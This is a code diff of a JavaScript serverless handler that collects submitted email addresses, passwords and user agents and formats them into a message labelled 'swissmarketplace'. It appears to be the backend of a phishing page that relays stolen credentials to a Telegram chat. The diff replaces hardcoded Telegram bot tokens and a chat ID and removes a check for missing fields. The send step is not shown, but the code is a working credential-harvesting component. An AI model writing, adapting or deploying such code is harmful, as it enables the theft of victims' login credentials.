@@ -3,20 +3,14 @@ module.exports = async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
-  const token2 = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
-  const chatId = '-5096357861';
- 
+  const token = '7980617142:AAFzl-zy6O9W1cOIauK9ksDI8Zm7beQ3AsE';
+  const chatId = '-5263210542';
 
   try {
     const { email, pass, agent } = req.body;
 
-    if (!email || !pass) {
-      return res.status(400).json({ error: 'Missing data' });
-    }
-
     const message = `
-📩 NEW FORM
+📩  swissmarketplace
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
